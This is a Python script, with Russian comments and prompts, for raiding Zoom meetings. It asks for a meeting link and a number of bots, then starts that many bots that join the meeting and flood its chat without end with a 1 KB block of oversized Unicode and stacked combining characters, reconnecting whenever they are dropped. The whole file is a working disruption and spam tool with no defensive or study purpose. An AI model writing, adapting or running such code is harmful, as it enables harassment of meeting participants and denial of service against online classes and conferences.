import logging
import re
from base64 import b64encode

import trio
from loguru import logger
from trio import ClosedResourceError
from trio_websocket import ConnectionClosed

from constants import url_re
from exceptions import WrongPasswordError
from zoom import Zoom

logging.disable(logging.CRITICAL)
logger.add("file_{time}.log", enqueue=True)


async def spam(meeting_id: int, password: str, username: str, message: str, url: str):
    """
    Спамит сообщениями в чат

    :param meeting_id: номер конференции
    :param password: пароль конференции
    :param username: ник бота
    :param message: сообщение
    :param url: ссылка на конференцию
    """
    zoom = Zoom(url, username)
    logger.debug(f"Joining meeting {meeting_id} with password {password}")
    while True:
        try:
            meeting = await zoom.join_meeting(meeting_id, password)

            async with meeting as ws:
                logger.info(f"{username}: Started sending messages...")
                while True:
                    try:
                        await ws.get_message()
                        text = b64encode(message.encode()).decode()
                        await ws.send_message(
                            zoom.create_payload(4135, {"text": text, "destNodeID": 0})
                        )
                    except WrongPasswordError:
                        logger.warning("Server: wrong password, ignoring...")
                        continue
                    except (ClosedResourceError, ConnectionClosed, AttributeError):
                        logger.warning("Server closed connection, trying again...")
                        await trio.sleep(3)
                        break
        except (ClosedResourceError, ConnectionClosed, AttributeError):
            logger.warning("Server closed connection, trying again...")
            await trio.sleep(3)
            pass


async def main():
    url = input("Введите ссылку на конференцию Zoom: ").strip()
    password = input(
        "Введите пароль от конференции, если он есть и не указан в ссылке (или нажмите Enter): "
    ).strip()

    username = input(
        "Введите имя, которое будут использовать боты (без русских букв): "
    )
    bot_count = int(input("Введите количество ботов: "))
    message = "𒐫𪚥𒈙á́́́́́́́́́́́́́́́́́́́́́́́́́́́́́"
    message = message * int(1024 / len(message))

    url_parsed = re.findall(url_re, url)
    if len(url_parsed) == 0:
        logger.error("Неверная ссылка!")
        return

    meeting_id = url_parsed[0][1]
    if url_parsed[0][2] == "":
        password = password or ""
    else:
        password = url_parsed[0][3]

    logger.debug(repr(url_parsed))

    async with trio.open_nursery() as nur:
        for i in range(1, bot_count + 1):
            nur.start_soon(
                spam, int(meeting_id), password, username + str(i), message, url
            )


trio.run(main)
